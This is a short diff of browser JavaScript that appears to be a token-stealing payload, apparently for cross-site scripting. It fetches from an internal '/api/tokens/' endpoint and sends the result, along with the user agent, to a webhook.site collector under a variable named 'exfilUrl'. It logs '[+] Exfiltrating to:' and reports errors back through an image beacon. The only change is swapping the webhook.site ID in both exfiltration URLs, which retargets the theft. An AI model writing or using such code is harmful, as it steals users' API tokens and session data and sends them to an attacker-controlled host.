@@ -12,7 +12,7 @@ fetch("/api/tokens/691e4e20744d5e6d95f51f40", {
     ua: navigator.userAgent
   };
 
-  const exfilUrl = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?data=" + encodeURIComponent(JSON.stringify(payload));
+  const exfilUrl = "https://webhook.site/03f59b91-ca5f-415e-ab63-e552fd7e6674?data=" + encodeURIComponent(JSON.stringify(payload));
 
   console.log("[+] Exfiltrating to:", exfilUrl);
 
@@ -23,6 +23,6 @@ fetch("/api/tokens/691e4e20744d5e6d95f51f40", {
   fetch(exfilUrl, { mode: "no-cors" });
 })
 .catch(err => {
-  const errorUrl = "https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=" + encodeURIComponent(err.message);
+  const errorUrl = "https://webhook.site/03f59b91-ca5f-415e-ab63-e552fd7e6674?error=" + encodeURIComponent(err.message);
   new Image().src = errorUrl;
 });
